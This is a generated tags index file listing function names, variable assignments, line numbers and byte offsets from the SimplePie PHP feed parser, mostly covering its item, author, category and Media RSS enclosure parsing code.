	function subscribe_rojo()subscribe_rojo2164,58992
	function subscribe_yahoo()subscribe_yahoo2169,59111
	function get_feed_tags($namespace, $tag)get_feed_tags2174,59217
		$type = $this->get_type();type2176,59262
	function get_channel_tags($namespace, $tag)get_channel_tags2208,60340
		$type = $this->get_type();type2210,60388
	function get_image_tags($namespace, $tag)get_image_tags2251,61340
		$type = $this->get_type();type2253,61386
	function get_base($element = array())get_base2287,62183
	function sanitize($data, $type, $base = '')sanitize2303,62526
	function sanitize($data, $type, $base = '')base2303,62526
	function get_title()get_title2308,62635
	function get_category($key = 0)get_category2344,64070
		$categories = $this->get_categories();categories2346,64106
	function get_categories()get_categories2357,64251
		$categories = array();categories2359,64281
			$term = null;term2363,64409
			$scheme = null;scheme2364,64426
			$label = null;label2365,64445
				$term = $this->sanitize($category['attribs']['']['term'], SIMPLEPIE_CONSTRUCT_TEXT);term2368,64516
				$scheme = $this->sanitize($category['attribs']['']['scheme'], SIMPLEPIE_CONSTRUCT_TEXT);scheme2372,64665
				$label = $this->sanitize($category['attribs']['']['label'], SIMPLEPIE_CONSTRUCT_TEXT);label2376,64817
			$term = $this->sanitize($category['data'], SIMPLEPIE_CONSTRUCT_TEXT);term2384,65234
				$scheme = $this->sanitize($category['attribs']['']['domain'], SIMPLEPIE_CONSTRUCT_TEXT);scheme2387,65362
				$scheme = null;scheme2391,65473
	function get_author($key = 0)get_author2414,66143
		$authors = $this->get_authors();authors2416,66177
	function get_authors()get_authors2427,66310
		$authors = array();authors2429,66337
			$name = null;name2432,66457
			$uri = null;uri2433,66474
			$email = null;email2434,66490
				$name = $this->sanitize($author['child'][SIMPLEPIE_NAMESPACE_ATOM_10]['name'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);name2437,66593
				$uri = $this->sanitize($author['child'][SIMPLEPIE_NAMESPACE_ATOM_10]['uri'][0]['data'], SIMPLEPIE_CONSTRUCT_IRI, $this->get_base($author['child'][SIMPLEPIE_NAMESPACE_ATOM_10]['uri'][0]));uri2441,66803
				$email = $this->sanitize($author['child'][SIMPLEPIE_NAMESPACE_ATOM_10]['email'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);email2445,67086
			$name = null;name2454,67435
			$url = null;url2455,67452
			$email = null;email2456,67468
				$name = $this->sanitize($author[0]['child'][SIMPLEPIE_NAMESPACE_ATOM_03]['name'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);name2459,67574
				$url = $this->sanitize($author[0]['child'][SIMPLEPIE_NAMESPACE_ATOM_03]['url'][0]['data'], SIMPLEPIE_CONSTRUCT_IRI, $this->get_base($author[0]['child'][SIMPLEPIE_NAMESPACE_ATOM_03]['url'][0]));url2463,67790
				$email = $this->sanitize($author[0]['child'][SIMPLEPIE_NAMESPACE_ATOM_03]['email'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);email2467,68082
	function get_contributor($key = 0)get_contributor2497,69113
		$contributors = $this->get_contributors();contributors2499,69152
	function get_contributors()get_contributors2510,69305
		$contributors = array();contributors2512,69337
			$name = null;name2515,69472
			$uri = null;uri2516,69489
			$email = null;email2517,69505
				$name = $this->sanitize($contributor['child'][SIMPLEPIE_NAMESPACE_ATOM_10]['name'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);name2520,69613
				$uri = $this->sanitize($contributor['child'][SIMPLEPIE_NAMESPACE_ATOM_10]['uri'][0]['data'], SIMPLEPIE_CONSTRUCT_IRI, $this->get_base($contributor['child'][SIMPLEPIE_NAMESPACE_ATOM_10]['uri'][0]));uri2524,69833
				$email = $this->sanitize($contributor['child'][SIMPLEPIE_NAMESPACE_ATOM_10]['email'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);email2528,70131
			$name = null;name2537,70514
			$url = null;url2538,70531
			$email = null;email2539,70547
				$name = $this->sanitize($contributor['child'][SIMPLEPIE_NAMESPACE_ATOM_03]['name'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);name2542,70655
				$url = $this->sanitize($contributor['child'][SIMPLEPIE_NAMESPACE_ATOM_03]['url'][0]['data'], SIMPLEPIE_CONSTRUCT_IRI, $this->get_base($contributor['child'][SIMPLEPIE_NAMESPACE_ATOM_03]['url'][0]));url2546,70875
				$email = $this->sanitize($contributor['child'][SIMPLEPIE_NAMESPACE_ATOM_03]['email'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);email2550,71173
	function get_link($key = 0, $rel = 'alternate')get_link2568,71576
	function get_link($key = 0, $rel = 'alternate')rel2568,71576
		$links = $this->get_links($rel);links2570,71628
	function get_permalink()get_permalink2584,71839
	function get_links($rel = 'alternate')get_links2589,71901
						$link_rel = (isset($link['attribs']['']['rel'])) ? $link['attribs']['']['rel'] : 'alternate';link_rel2600,72191
						$link_rel = (isset($link['attribs']['']['rel'])) ? $link['attribs']['']['rel'] : 'alternate';link_rel2611,72619
			$keys = array_keys($this->data['links']);keys2630,73532
	function get_all_discovered_feeds()get_all_discovered_feeds2663,74559
	function get_description()get_description2668,74641
	function get_copyright()get_copyright2712,76500
	function get_language()get_language2740,77518
	function get_latitude()get_latitude2776,78907
	function get_longitude()get_longitude2793,79330
	function get_image_title()get_image_title2813,79887
	function get_image_url()get_image_url2841,80753
	function get_image_link()get_image_link2873,81934
	function get_image_width()get_image_width2893,82560
	function get_image_height()get_image_height2909,82893
	function get_item_quantity($max = 0)get_item_quantity2925,83228
		$max = (int) $max;max2927,83269
		$qty = count($this->get_items());qty2928,83290
	function get_item($key = 0)get_item2939,83426
		$items = $this->get_items();items2941,83458
	function get_items($start = 0, $end = 0)get_items2952,83583
	function get_items($start = 0, $end = 0)end2952,83583
					$keys = array_keys($items);keys2965,83961
					$keys = array_keys($items);keys2973,84202
					$keys = array_keys($items);keys2981,84441
					$keys = array_keys($items);keys2989,84681
					$keys = array_keys($items);keys2997,84923
					$do_sort = true;do_sort3013,85339
							$do_sort = false;do_sort3018,85454
					$item = null;item3022,85508
				$items = $this->data['ordered_items'];items3029,85696
				$items = $this->data['items'];items3033,85757
	function sort_items($a, $b)sort_items3055,86027
	function merge_items($urls, $start = 0, $end = 0, $limit = 0)merge_items3063,86134
	function merge_items($urls, $start = 0, $end = 0, $limit = 0)start3063,86134
			$items = array();items3067,86248
					$items = array_merge($items, $arg->get_items(0, $limit));items3072,86340
			$do_sort = true;do_sort3080,86511
					$do_sort = false;do_sort3085,86602
			$item = null;item3089,86648
class SimplePie_ItemSimplePie_Item3112,86996
	var $feed;feed3114,87019
	var $data = array();data3115,87031
	var $data = array();data3115,87031
	function SimplePie_Item($feed, $data)SimplePie_Item3117,87054
		$this->feed = $feed;feed3119,87096
		$this->data = $data;data3120,87119
	function __toString()__toString3123,87146
	function __destruct()__destruct3131,87294
	function get_item_tags($namespace, $tag)get_item_tags3139,87465
	function get_base($element = array())get_base3151,87656
	function sanitize($data, $type, $base = '')sanitize3156,87744
	function sanitize($data, $type, $base = '')base3156,87744
	function get_feed()get_feed3161,87849
	function get_id($hash = false)get_id3166,87899
	function get_title()get_title3209,89139
	function get_description($description_only = false)get_description3249,90788
	function get_content($content_only = false)get_content3298,92655
	function get_category($key = 0)get_category3322,93481
		$categories = $this->get_categories();categories3324,93517
	function get_categories()get_categories3335,93662
		$categories = array();categories3337,93692
			$term = null;term3341,93817
			$scheme = null;scheme3342,93834
			$label = null;label3343,93853
				$term = $this->sanitize($category['attribs']['']['term'], SIMPLEPIE_CONSTRUCT_TEXT);term3346,93924
				$scheme = $this->sanitize($category['attribs']['']['scheme'], SIMPLEPIE_CONSTRUCT_TEXT);scheme3350,94073
				$label = $this->sanitize($category['attribs']['']['label'], SIMPLEPIE_CONSTRUCT_TEXT);label3354,94225
			$term = $this->sanitize($category['data'], SIMPLEPIE_CONSTRUCT_TEXT);term3362,94645
				$scheme = $this->sanitize($category['attribs']['']['domain'], SIMPLEPIE_CONSTRUCT_TEXT);scheme3365,94773
				$scheme = null;scheme3369,94884
	function get_author($key = 0)get_author3392,95566
		$authors = $this->get_authors();authors3394,95600
	function get_contributor($key = 0)get_contributor3405,95733
		$contributors = $this->get_contributors();contributors3407,95772
	function get_contributors()get_contributors3418,95925
		$contributors = array();contributors3420,95957
			$name = null;name3423,96089
			$uri = null;uri3424,96106
			$email = null;email3425,96122
				$name = $this->sanitize($contributor['child'][SIMPLEPIE_NAMESPACE_ATOM_10]['name'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);name3428,96230
				$uri = $this->sanitize($contributor['child'][SIMPLEPIE_NAMESPACE_ATOM_10]['uri'][0]['data'], SIMPLEPIE_CONSTRUCT_IRI, $this->get_base($contributor['child'][SIMPLEPIE_NAMESPACE_ATOM_10]['uri'][0]));uri3432,96450
				$email = $this->sanitize($contributor['child'][SIMPLEPIE_NAMESPACE_ATOM_10]['email'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);email3436,96748
			$name = null;name3445,97134
			$url = null;url3446,97151
			$email = null;email3447,97167
				$name = $this->sanitize($contributor['child'][SIMPLEPIE_NAMESPACE_ATOM_03]['name'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);name3450,97275
				$url = $this->sanitize($contributor['child'][SIMPLEPIE_NAMESPACE_ATOM_03]['url'][0]['data'], SIMPLEPIE_CONSTRUCT_IRI, $this->get_base($contributor['child'][SIMPLEPIE_NAMESPACE_ATOM_03]['url'][0]));url3454,97495
				$email = $this->sanitize($contributor['child'][SIMPLEPIE_NAMESPACE_ATOM_03]['email'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);email3458,97793
	function get_authors()get_authors3476,98202
		$authors = array();authors3478,98229
			$name = null;name3481,98346
			$uri = null;uri3482,98363
			$email = null;email3483,98379
				$name = $this->sanitize($author['child'][SIMPLEPIE_NAMESPACE_ATOM_10]['name'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);name3486,98482
				$uri = $this->sanitize($author['child'][SIMPLEPIE_NAMESPACE_ATOM_10]['uri'][0]['data'], SIMPLEPIE_CONSTRUCT_IRI, $this->get_base($author['child'][SIMPLEPIE_NAMESPACE_ATOM_10]['uri'][0]));uri3490,98692
				$email = $this->sanitize($author['child'][SIMPLEPIE_NAMESPACE_ATOM_10]['email'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);email3494,98975
			$name = null;name3503,99327
			$url = null;url3504,99344
			$email = null;email3505,99360
				$name = $this->sanitize($author[0]['child'][SIMPLEPIE_NAMESPACE_ATOM_03]['name'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);name3508,99466
				$url = $this->sanitize($author[0]['child'][SIMPLEPIE_NAMESPACE_ATOM_03]['url'][0]['data'], SIMPLEPIE_CONSTRUCT_IRI, $this->get_base($author[0]['child'][SIMPLEPIE_NAMESPACE_ATOM_03]['url'][0]));url3512,99682
				$email = $this->sanitize($author[0]['child'][SIMPLEPIE_NAMESPACE_ATOM_03]['email'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);email3516,99974
	function get_copyright()get_copyright3558,101414
	function get_date($date_format = 'j F Y, g:i a')get_date3578,102022
				$parser = SimplePie_Parse_Date::get();parser3617,103318
			$date_format = (string) $date_format;date_format3627,103531
	function get_local_date($date_format = '%c')get_local_date3646,103877
	function get_permalink()get_permalink3662,104183
		$link = $this->get_link();link3664,104212
		$enclosure = $this->get_enclosure(0);enclosure3665,104241
	function get_link($key = 0, $rel = 'alternate')get_link3680,104436
	function get_link($key = 0, $rel = 'alternate')rel3680,104436
		$links = $this->get_links($rel);links3682,104488
	function get_links($rel = 'alternate')get_links3693,104619
					$link_rel = (isset($link['attribs']['']['rel'])) ? $link['attribs']['']['rel'] : 'alternate';link_rel3702,104881
					$link_rel = (isset($link['attribs']['']['rel'])) ? $link['attribs']['']['rel'] : 'alternate';link_rel3711,105273
			$keys = array_keys($this->data['links']);keys3735,106524
	function get_enclosure($key = 0, $prefer = null)get_enclosure3770,107645
	function get_enclosure($key = 0, $prefer = null)prefer3770,107645
		$enclosures = $this->get_enclosures();enclosures3772,107698
	function get_enclosures()get_enclosures3793,108413
			$captions_parent = null;captions_parent3800,108544
			$categories_parent = null;categories_parent3801,108572
			$copyrights_parent = null;copyrights_parent3802,108602
			$credits_parent = null;credits_parent3803,108632
			$description_parent = null;description_parent3804,108659
			$duration_parent = null;duration_parent3805,108690
			$hashes_parent = null;hashes_parent3806,108718
			$keywords_parent = null;keywords_parent3807,108744
			$player_parent = null;player_parent3808,108772
			$ratings_parent = null;ratings_parent3809,108798
			$restrictions_parent = null;restrictions_parent3810,108825
			$thumbnails_parent = null;thumbnails_parent3811,108857
			$title_parent = null;title_parent3812,108887
			$parent = $this->get_feed();parent3815,109003
					$caption_type = null;caption_type3822,109177
					$caption_lang = null;caption_lang3823,109204
					$caption_startTime = null;caption_startTime3824,109231
					$caption_endTime = null;caption_endTime3825,109263
					$caption_text = null;caption_text3826,109293
						$caption_type = $this->sanitize($caption['attribs']['']['type'], SIMPLEPIE_CONSTRUCT_TEXT);caption_type3829,109376
						$caption_lang = $this->sanitize($caption['attribs']['']['lang'], SIMPLEPIE_CONSTRUCT_TEXT);caption_lang3833,109537
						$caption_startTime = $this->sanitize($caption['attribs']['']['start'], SIMPLEPIE_CONSTRUCT_TEXT);caption_startTime3837,109699
						$caption_endTime = $this->sanitize($caption['attribs']['']['end'], SIMPLEPIE_CONSTRUCT_TEXT);caption_endTime3841,109865
						$caption_text = $this->sanitize($caption['data'], SIMPLEPIE_CONSTRUCT_TEXT);caption_text3845,110013
					$caption_type = null;caption_type3854,110391
					$caption_lang = null;caption_lang3855,110418
					$caption_startTime = null;caption_startTime3856,110445
					$caption_endTime = null;caption_endTime3857,110477
					$caption_text = null;caption_text3858,110507
						$caption_type = $this->sanitize($caption['attribs']['']['type'], SIMPLEPIE_CONSTRUCT_TEXT);caption_type3861,110590
						$caption_lang = $this->sanitize($caption['attribs']['']['lang'], SIMPLEPIE_CONSTRUCT_TEXT);caption_lang3865,110751
						$caption_startTime = $this->sanitize($caption['attribs']['']['start'], SIMPLEPIE_CONSTRUCT_TEXT);caption_startTime3869,110913
						$caption_endTime = $this->sanitize($caption['attribs']['']['end'], SIMPLEPIE_CONSTRUCT_TEXT);caption_endTime3873,111079
						$caption_text = $this->sanitize($caption['data'], SIMPLEPIE_CONSTRUCT_TEXT);caption_text3877,111227
				$captions_parent = array_values(SimplePie_Misc::array_unique($captions_parent));captions_parent3884,111510
				$term = null;term3890,111720
				$scheme = null;scheme3891,111738
				$label = null;label3892,111758
					$term = $this->sanitize($category['data'], SIMPLEPIE_CONSTRUCT_TEXT);term3895,111817
					$scheme = $this->sanitize($category['attribs']['']['scheme'], SIMPLEPIE_CONSTRUCT_TEXT);scheme3899,111955
					$scheme = 'http://search.yahoo.com/mrss/category_schema';scheme3903,112070
					$label = $this->sanitize($category['attribs']['']['label'], SIMPLEPIE_CONSTRUCT_TEXT);label3907,112195
				$term = null;term3913,112490
				$scheme = null;scheme3914,112508
				$label = null;label3915,112528
					$term = $this->sanitize($category['data'], SIMPLEPIE_CONSTRUCT_TEXT);term3918,112587
					$scheme = $this->sanitize($category['attribs']['']['scheme'], SIMPLEPIE_CONSTRUCT_TEXT);scheme3922,112725
					$scheme = 'http://search.yahoo.com/mrss/category_schema';scheme3926,112840
					$label = $this->sanitize($category['attribs']['']['label'], SIMPLEPIE_CONSTRUCT_TEXT);label3930,112965
				$term = null;term3936,113258
				$scheme = 'http://www.itunes.com/dtds/podcast-1.0.dtd';scheme3937,113276
				$label = null;label3938,113336
					$label = $this->sanitize($category['attribs']['']['text'], SIMPLEPIE_CONSTRUCT_TEXT);label3941,113410
							$label = $this->sanitize($subcategory['attribs']['']['text'], SIMPLEPIE_CONSTRUCT_TEXT);label3951,113841
				$categories_parent = array_values(SimplePie_Misc::array_unique($categories_parent));categories_parent3959,114092
				$copyright_url = null;copyright_url3965,114293
				$copyright_label = null;copyright_label3966,114320
					$copyright_url = $this->sanitize($copyright[0]['attribs']['']['url'], SIMPLEPIE_CONSTRUCT_TEXT);copyright_url3969,114407
					$copyright_label = $this->sanitize($copyright[0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);copyright_label3973,114559
				$copyrights_parent =& new $this->feed->copyright_class($copyright_url, $copyright_label);copyrights_parent3975,114655
				$copyright_url = null;copyright_url3979,114853
				$copyright_label = null;copyright_label3980,114880
					$copyright_url = $this->sanitize($copyright[0]['attribs']['']['url'], SIMPLEPIE_CONSTRUCT_TEXT);copyright_url3983,114967
					$copyright_label = $this->sanitize($copyright[0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);copyright_label3987,115119
				$copyrights_parent =& new $this->feed->copyright_class($copyright_url, $copyright_label);copyrights_parent3989,115215
					$credit_role = null;credit_role3997,115454
					$credit_scheme = null;credit_scheme3998,115480
					$credit_name = null;credit_name3999,115508
						$credit_role = $this->sanitize($credit['attribs']['']['role'], SIMPLEPIE_CONSTRUCT_TEXT);credit_role4002,115589
						$credit_scheme = $this->sanitize($credit['attribs']['']['scheme'], SIMPLEPIE_CONSTRUCT_TEXT);credit_scheme4006,115749
						$credit_scheme = 'urn:ebu';credit_scheme4010,115873
						$credit_name = $this->sanitize($credit['data'], SIMPLEPIE_CONSTRUCT_TEXT);credit_name4014,115954
					$credit_role = null;credit_role4023,116288
					$credit_scheme = null;credit_scheme4024,116314
					$credit_name = null;credit_name4025,116342
						$credit_role = $this->sanitize($credit['attribs']['']['role'], SIMPLEPIE_CONSTRUCT_TEXT);credit_role4028,116423
						$credit_scheme = $this->sanitize($credit['attribs']['']['scheme'], SIMPLEPIE_CONSTRUCT_TEXT);credit_scheme4032,116583
						$credit_scheme = 'urn:ebu';credit_scheme4036,116707
						$credit_name = $this->sanitize($credit['data'], SIMPLEPIE_CONSTRUCT_TEXT);credit_name4040,116788
				$credits_parent = array_values(SimplePie_Misc::array_unique($credits_parent));credits_parent4047,117027
					$description_parent = $this->sanitize($description_parent[0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);description_parent4055,117288
					$description_parent = $this->sanitize($description_parent[0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);description_parent4062,117564
				$seconds = null;seconds4069,117786
				$minutes = null;minutes4070,117807
				$hours = null;hours4071,117828
					$temp = explode(':', $this->sanitize($duration_parent[0]['data'], SIMPLEPIE_CONSTRUCT_TEXT));temp4074,117897
						$seconds = (int) array_pop($temp);seconds4077,118031
						$minutes = (int) array_pop($temp);minutes4081,118114
						$hours = (int) array_pop($temp);hours4086,118230
					$duration_parent = $seconds;duration_parent4090,118328
					$value = null;value4099,118524
					$algo = null;algo4100,118544
						$value = $this->sanitize($hash['data'], SIMPLEPIE_CONSTRUCT_TEXT);value4103,118601
						$algo = $this->sanitize($hash['attribs']['']['algo'], SIMPLEPIE_CONSTRUCT_TEXT);algo4107,118734
						$algo = 'md5';algo4111,118845
					$value = null;value4120,119072
					$algo = null;algo4121,119092
						$value = $this->sanitize($hash['data'], SIMPLEPIE_CONSTRUCT_TEXT);value4124,119149
						$algo = $this->sanitize($hash['attribs']['']['algo'], SIMPLEPIE_CONSTRUCT_TEXT);algo4128,119282
						$algo = 'md5';algo4132,119393
				$hashes_parent = array_values(SimplePie_Misc::array_unique($hashes_parent));hashes_parent4139,119512
					$temp = explode(',', $this->sanitize($keywords[0]['data'], SIMPLEPIE_CONSTRUCT_TEXT));temp4147,119745
					$temp = explode(',', $this->sanitize($keywords[0]['data'], SIMPLEPIE_CONSTRUCT_TEXT));temp4159,120083
					$temp = explode(',', $this->sanitize($keywords[0]['data'], SIMPLEPIE_CONSTRUCT_TEXT));temp4171,120428
					$temp = explode(',', $this->sanitize($keywords[0]['data'], SIMPLEPIE_CONSTRUCT_TEXT));temp4183,120771
				$keywords_parent = array_values(SimplePie_Misc::array_unique($keywords_parent));keywords_parent4193,121016
					$player_parent = $this->sanitize($player_parent[0]['attribs']['']['url'], SIMPLEPIE_CONSTRUCT_IRI);player_parent4201,121273
					$player_parent = $this->sanitize($player_parent[0]['attribs']['']['url'], SIMPLEPIE_CONSTRUCT_IRI);player_parent4208,121551
					$rating_scheme = null;rating_scheme4217,121807
					$rating_value = null;rating_value4218,121835
						$rating_scheme = $this->sanitize($rating['attribs']['']['scheme'], SIMPLEPIE_CONSTRUCT_TEXT);rating_scheme4221,121919
						$rating_scheme = 'urn:simple';rating_scheme4225,122043
						$rating_value = $this->sanitize($rating['data'], SIMPLEPIE_CONSTRUCT_TEXT);rating_value4229,122127
					$rating_scheme = 'urn:itunes';rating_scheme4238,122444
					$rating_value = null;rating_value4239,122480
						$rating_value = $this->sanitize($rating['data'], SIMPLEPIE_CONSTRUCT_TEXT);rating_value4242,122547
					$rating_scheme = null;rating_scheme4251,122869
					$rating_value = null;rating_value4252,122897
						$rating_scheme = $this->sanitize($rating['attribs']['']['scheme'], SIMPLEPIE_CONSTRUCT_TEXT);rating_scheme4255,122981
						$rating_scheme = 'urn:simple';rating_scheme4259,123105
						$rating_value = $this->sanitize($rating['data'], SIMPLEPIE_CONSTRUCT_TEXT);rating_value4263,123189
					$rating_scheme = 'urn:itunes';rating_scheme4272,123511
					$rating_value = null;rating_value4273,123547
						$rating_value = $this->sanitize($rating['data'], SIMPLEPIE_CONSTRUCT_TEXT);rating_value4276,123614
				$ratings_parent = array_values(SimplePie_Misc::array_unique($ratings_parent));ratings_parent4283,123841
					$restriction_relationship = null;restriction_relationship4291,124094
					$restriction_type = null;restriction_type4292,124133
					$restriction_value = null;restriction_value4293,124164
						$restriction_relationship = $this->sanitize($restriction['attribs']['']['relationship'], SIMPLEPIE_CONSTRUCT_TEXT);restriction_relationship4296,124264
						$restriction_type = $this->sanitize($restriction['attribs']['']['type'], SIMPLEPIE_CONSTRUCT_TEXT);restriction_type4300,124453
						$restriction_value = $this->sanitize($restriction['data'], SIMPLEPIE_CONSTRUCT_TEXT);restriction_value4304,124611
					$restriction_relationship = 'allow';restriction_relationship4313,124995
					$restriction_type = null;restriction_type4314,125037
					$restriction_value = 'itunes';restriction_value4315,125068
						$restriction_relationship = 'deny';restriction_relationship4318,125195
					$restriction_relationship = null;restriction_relationship4327,125542
					$restriction_type = null;restriction_type4328,125581
					$restriction_value = null;restriction_value4329,125612
						$restriction_relationship = $this->sanitize($restriction['attribs']['']['relationship'], SIMPLEPIE_CONSTRUCT_TEXT);restriction_relationship4332,125712
						$restriction_type = $this->sanitize($restriction['attribs']['']['type'], SIMPLEPIE_CONSTRUCT_TEXT);restriction_type4336,125901
						$restriction_value = $this->sanitize($restriction['data'], SIMPLEPIE_CONSTRUCT_TEXT);restriction_value4340,126059
					$restriction_relationship = 'allow';restriction_relationship4349,126448
					$restriction_type = null;restriction_type4350,126490
					$restriction_value = 'itunes';restriction_value4351,126521
						$restriction_relationship = 'deny';restriction_relationship4354,126648
				$restrictions_parent = array_values(SimplePie_Misc::array_unique($restrictions_parent));restrictions_parent4361,126885
					$title_parent = $this->sanitize($title_parent[0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);title_parent4391,127794
					$title_parent = $this->sanitize($title_parent[0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);title_parent4398,128040
			$bitrate = null;bitrate4406,128202
			$channels = null;channels4407,128222
			$duration = null;duration4408,128243
			$expression = null;expression4409,128264
			$framerate = null;framerate4410,128287
			$height = null;height4411,128309
			$javascript = null;javascript4412,128328
			$lang = null;lang4413,128351
			$length = null;length4414,128368
			$medium = null;medium4415,128387
			$samplingrate = null;samplingrate4416,128406
			$type = null;type4417,128431
			$url = null;url4418,128448
			$width = null;width4419,128464
			$captions = null;captions4422,128498
			$categories = null;categories4423,128519
			$copyrights = null;copyrights4424,128542
			$credits = null;credits4425,128565
			$description = null;description4426,128585
			$hashes = null;hashes4427,128609
			$keywords = null;keywords4428,128628
			$player = null;player4429,128649
			$ratings = null;ratings4430,128668
			$restrictions = null;restrictions4431,128688
			$thumbnails = null;thumbnails4432,128713
			$title = null;title4433,128736
							$bitrate = null;bitrate4446,129244
							$channels = null;channels4447,129268
							$duration = null;duration4448,129293
							$expression = null;expression4449,129318
							$framerate = null;framerate4450,129345
							$height = null;height4451,129371
							$javascript = null;javascript4452,129394
							$lang = null;lang4453,129421
							$length = null;length4454,129442
							$medium = null;medium4455,129465
							$samplingrate = null;samplingrate4456,129488
							$type = null;type4457,129517
							$url = null;url4458,129538
							$width = null;width4459,129558
							$captions = null;captions4462,129600
							$categories = null;categories4463,129625
							$copyrights = null;copyrights4464,129652
							$credits = null;credits4465,129679
							$description = null;description4466,129703
							$hashes = null;hashes4467,129731
							$keywords = null;keywords4468,129754
							$player = null;player4469,129779
							$ratings = null;ratings4470,129802
							$restrictions = null;restrictions4471,129826
							$thumbnails = null;thumbnails4472,129855
							$title = null;title4473,129882
								$bitrate = $this->sanitize($content['attribs']['']['bitrate'], SIMPLEPIE_CONSTRUCT_TEXT);bitrate4478,130025
								$channels = $this->sanitize($content['attribs']['']['channels'], SIMPLEPIE_CONSTRUCT_TEXT);channels4482,130196
								$duration = $this->sanitize($content['attribs']['']['duration'], SIMPLEPIE_CONSTRUCT_TEXT);duration4486,130369
								$duration = $duration_parent;duration4490,130499
								$expression = $this->sanitize($content['attribs']['']['expression'], SIMPLEPIE_CONSTRUCT_TEXT);expression4494,130612
								$framerate = $this->sanitize($content['attribs']['']['framerate'], SIMPLEPIE_CONSTRUCT_TEXT);framerate4498,130790
								$height = $this->sanitize($content['attribs']['']['height'], SIMPLEPIE_CONSTRUCT_TEXT);height4502,130963
								$lang = $this->sanitize($content['attribs']['']['lang'], SIMPLEPIE_CONSTRUCT_TEXT);lang4506,131128
								$length = ceil($content['attribs']['']['fileSize']);length4510,131293
								$medium = $this->sanitize($content['attribs']['']['medium'], SIMPLEPIE_CONSTRUCT_TEXT);medium4514,131425
								$samplingrate = $this->sanitize($content['attribs']['']['samplingrate'], SIMPLEPIE_CONSTRUCT_TEXT);samplingrate4518,131598
								$type = $this->sanitize($content['attribs']['']['type'], SIMPLEPIE_CONSTRUCT_TEXT);type4522,131775
								$width = $this->sanitize($content['attribs']['']['width'], SIMPLEPIE_CONSTRUCT_TEXT);width4526,131937
							$url = $this->sanitize($content['attribs']['']['url'], SIMPLEPIE_CONSTRUCT_IRI);url4528,132040
									$caption_type = null;caption_type4537,132436
									$caption_lang = null;caption_lang4538,132467
									$caption_startTime = null;caption_startTime4539,132498
									$caption_endTime = null;caption_endTime4540,132534
									$caption_text = null;caption_text4541,132568
										$caption_type = $this->sanitize($caption['attribs']['']['type'], SIMPLEPIE_CONSTRUCT_TEXT);caption_type4544,132663
										$caption_lang = $this->sanitize($caption['attribs']['']['lang'], SIMPLEPIE_CONSTRUCT_TEXT);caption_lang4548,132840
										$caption_startTime = $this->sanitize($caption['attribs']['']['start'], SIMPLEPIE_CONSTRUCT_TEXT);caption_startTime4552,133018
										$caption_endTime = $this->sanitize($caption['attribs']['']['end'], SIMPLEPIE_CONSTRUCT_TEXT);caption_endTime4556,133200
										$caption_text = $this->sanitize($caption['data'], SIMPLEPIE_CONSTRUCT_TEXT);caption_text4560,133364
									$captions = array_values(SimplePie_Misc::array_unique($captions));captions4566,133654
									$caption_type = null;caption_type4573,133929
									$caption_lang = null;caption_lang4574,133960
									$caption_startTime = null;caption_startTime4575,133991
									$caption_endTime = null;caption_endTime4576,134027
									$caption_text = null;caption_text4577,134061
										$caption_type = $this->sanitize($caption['attribs']['']['type'], SIMPLEPIE_CONSTRUCT_TEXT);caption_type4580,134156
										$caption_lang = $this->sanitize($caption['attribs']['']['lang'], SIMPLEPIE_CONSTRUCT_TEXT);caption_lang4584,134333
										$caption_startTime = $this->sanitize($caption['attribs']['']['start'], SIMPLEPIE_CONSTRUCT_TEXT);caption_startTime4588,134511
										$caption_endTime = $this->sanitize($caption['attribs']['']['end'], SIMPLEPIE_CONSTRUCT_TEXT);caption_endTime4592,134693
										$caption_text = $this->sanitize($caption['data'], SIMPLEPIE_CONSTRUCT_TEXT);caption_text4596,134857
									$captions = array_values(SimplePie_Misc::array_unique($captions));captions4602,135147
								$captions = $captions_parent;captions4607,135263
									$term = null;term4615,135529
									$scheme = null;scheme4616,135552
									$label = null;label4617,135577
										$term = $this->sanitize($category['data'], SIMPLEPIE_CONSTRUCT_TEXT);term4620,135651
										$scheme = $this->sanitize($category['attribs']['']['scheme'], SIMPLEPIE_CONSTRUCT_TEXT);scheme4624,135809
										$scheme = 'http://search.yahoo.com/mrss/category_schema';scheme4628,135944
										$label = $this->sanitize($category['attribs']['']['label'], SIMPLEPIE_CONSTRUCT_TEXT);label4632,136089
									$term = null;term4641,136492
									$scheme = null;scheme4642,136515
									$label = null;label4643,136540
										$term = $this->sanitize($category['data'], SIMPLEPIE_CONSTRUCT_TEXT);term4646,136614
										$scheme = $this->sanitize($category['attribs']['']['scheme'], SIMPLEPIE_CONSTRUCT_TEXT);scheme4650,136772
										$scheme = 'http://search.yahoo.com/mrss/category_schema';scheme4654,136907
										$label = $this->sanitize($category['attribs']['']['label'], SIMPLEPIE_CONSTRUCT_TEXT);label4658,137052
								$categories = array_values(SimplePie_Misc::array_unique(array_merge($categories, $categories_parent)));categories4665,137337
								$categories = array_values(SimplePie_Misc::array_unique($categories));categories4669,137505
								$categories = array_values(SimplePie_Misc::array_unique($categories_parent));categories4673,137647
								$copyright_url = null;copyright_url4679,137853
								$copyright_label = null;copyright_label4680,137884
									$copyright_url = $this->sanitize($content['child'][SIMPLEPIE_NAMESPACE_MEDIARSS]['copyright'][0]['attribs']['']['url'], SIMPLEPIE_CONSTRUCT_TEXT);copyright_url4683,138033
									$copyright_label = $this->sanitize($content['child'][SIMPLEPIE_NAMESPACE_MEDIARSS]['copyright'][0]['data'], SIMPLEPIE_CONSTRUCT_TEXT);copyright_label4687,138301
